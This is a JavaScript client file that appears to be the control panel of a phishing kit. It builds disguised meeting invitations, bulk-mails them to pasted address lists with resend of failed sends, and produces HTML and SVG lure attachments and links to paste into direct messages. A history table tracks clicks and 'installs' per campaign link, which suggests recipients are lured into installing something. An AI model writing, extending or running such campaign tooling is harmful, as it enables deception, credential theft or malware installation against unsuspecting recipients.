(function () {
  'use strict';
  var service = 'copy';
  var last = null;
  var $ = function (id) { return document.getElementById(id); };

  function notice(text, ok) {
    var el = $('notice');
    el.textContent = text;
    el.style.background = ok ? '#e8f7ef' : '#fff8e8';
    el.style.color = ok ? '#0b8a57' : '#9a5410';
    el.classList.add('show');
  }

  document.querySelectorAll('.svc[data-service]').forEach(function (button) {
    button.addEventListener('click', function () {
      service = button.getAttribute('data-service');
      document.querySelectorAll('.svc').forEach(function (b) { b.classList.remove('on'); });
      button.classList.add('on');
    });
  });

  async function copy(text) {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
      } else {
        var area = document.createElement('textarea');
        area.value = text;
        document.body.appendChild(area);
        area.select();
        document.execCommand('copy');
        area.remove();
      }
      notice('Copied.', true);
    } catch (error) {
      notice('Copy failed — select the link manually.', false);
    }
  }

  $('build').addEventListener('click', async function () {
    var button = $('build');
    button.disabled = true;
    $('notice').classList.remove('show');
    try {
      var response = await fetch('/api/build', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          service: service,
          emails: $('emails').value,
          meetingId: $('meeting').value,
          pwd: $('pwd').value,
          subject: $('subject').value,
          message: $('message').value,
          src: $('src').value,
          who: $('who').value,
          co: $('co').value
        })
      });
      var data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Could not build the invitation.');
      last = data;
      $('linkbox').textContent = data.target;
      $('open').href = data.link;
      $('test').href = data.target;
      $('result').classList.add('show');
      $('status').textContent = data.recipients + ' recipient(s) · service: ' + data.service + ' · link ' + data.id;
      copy(data.target);
      if (data.async) {
        notice('Sending to ' + data.recipients + ' recipient(s)…', true);
        pollJob(data.job, refreshHistory);
      } else if (typeof data.sent_ok === 'number') {
        var msg = 'Invitation sent to ' + data.sent_ok + ' recipient(s)';
        if (data.sent_failed) msg += ' (' + data.sent_failed + ' failed)';
        notice(msg, true);
        refreshHistory();
      } else {
        notice('Invitation ready. Link copied to clipboard.', true);
        refreshHistory();
      }
    } catch (error) {
      notice(error.message, false);
    } finally {
      button.disabled = false;
    }
  });

  $('buildlink').addEventListener('click', async function () {
    var button = $('buildlink');
    button.disabled = true;
    $('notice').classList.remove('show');
    try {
      var response = await fetch('/api/link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          meetingId: $('meeting').value,
          pwd: $('pwd').value,
          src: $('src').value,
          who: $('who').value,
          co: $('co').value
        })
      });
      var data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Could not create the link.');
      last = data;
      $('linkbox').textContent = data.target;
      $('open').href = data.meeting;
      $('test').href = data.target;
      $('attach').href = data.attachHtml;
      $('attachsvg').href = data.attachSvg;
      $('result').classList.add('show');
      $('status').textContent = 'link ' + data.id + ' - ' + data.src + (data.who ? ' - ' + data.who : '');
      notice('Link ready. Copy it into the DM or use the attachment.', true);
      copy(data.target);
    } catch (error) {
      notice(error.message, false);
    } finally {
      button.disabled = false;
    }
  });
  $('copy').addEventListener('click', function () { if (last) copy(last.target); });
  $('copybody').addEventListener('click', function () { if (last) copy(last.body); });
  $('year').textContent = new Date().getFullYear();

  // ------------------------------------------------------------------ history
  function fmt(iso) { try { return new Date(iso).toLocaleString(); } catch (e) { return iso || ''; } }
  function cell(text, cls) { var d = document.createElement('div'); if (cls) d.className = cls; d.textContent = text; return d; }

  function pollJob(id, onDone) {
    var tries = 0;
    var timer = setInterval(async function () {
      tries++;
      try {
        var r = await fetch('/api/job?id=' + id);
        var j = await r.json();
        if (j && j.status === 'running') {
          notice('Sending… ' + j.done + '/' + j.total + ' (sent ' + j.sent + ', failed ' + j.failed + ')', true);
          return;
        }
        clearInterval(timer);
        notice(j && j.status === 'error'
          ? ('Send error: ' + (j.reason || ''))
          : ('Sent ' + (j.sent || 0) + ' · failed ' + (j.failed || 0)), !(j && j.status === 'error'));
        if (onDone) onDone();
      } catch (e) {
        if (tries > 900) clearInterval(timer);
      }
    }, 3000);
  }

  async function resend(id, total, only) {
    $('notice').classList.remove('show');
    try {
      var r = await fetch('/api/resend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: id, only: only, async: total > 150 })
      });
      var data = await r.json();
      if (!r.ok) throw new Error(data.error || 'Resend failed.');
      if (data.async) { notice('Resending to ' + data.recipients + '…', true); pollJob(data.job, refreshHistory); }
      else { notice('Resent to ' + data.recipients + ' (sent ' + data.sent_ok + ', failed ' + data.sent_failed + ')', true); refreshHistory(); }
    } catch (e) { notice(e.message, false); }
  }

  async function refreshHistory() {
    var box = $('history');
    try {
      var r = await fetch('/api/history?limit=50');
      var data = await r.json();
      var rows = (data.links || []);
      box.innerHTML = '';
      var head = document.createElement('div');
      head.className = 'hrow head';
      ['When', 'Recipients', 'Sent', 'Failed', 'Clicks', 'Installs', 'Action'].forEach(function (h) {
        head.appendChild(cell(h));
      });
      box.appendChild(head);
      if (!rows.length) { $('histstatus').textContent = 'No sends yet.'; return; }
      $('histstatus').textContent = rows.length + ' recent link(s).';
      rows.forEach(function (row) {
        var line = document.createElement('div');
        line.className = 'hrow';
        line.appendChild(cell(fmt(row.created), 'm'));
        line.appendChild(cell(String(row.recipients) + (row.emails_stored ? '' : ' *')));
        line.appendChild(cell(String(row.sends_sent)));
        line.appendChild(cell(String(row.sends_failed), row.sends_failed ? 'm' : ''));
        line.appendChild(cell(String(row.clicks)));
        line.appendChild(cell(String(row.installs) + (row.installs_fail ? '/' + row.installs_fail : '')));
        var act = document.createElement('div');
        if (row.emails_stored) {
          var b1 = document.createElement('button'); b1.textContent = 'Resend';
          b1.addEventListener('click', function () { resend(row.id, row.recipients, 'all'); });
          act.appendChild(b1);
          if (row.sends_failed) {
            var b2 = document.createElement('button'); b2.textContent = 'Resend failed';
            b2.style.marginLeft = '6px';
            b2.addEventListener('click', function () { resend(row.id, row.recipients, 'failed'); });
            act.appendChild(b2);
          }
        } else {
          act.appendChild(cell('no list *', 'm'));
        }
        line.appendChild(act);
        box.appendChild(line);
      });
    } catch (e) {
      $('histstatus').textContent = 'History unavailable: ' + e.message;
    }
  }

  refreshHistory();
})();
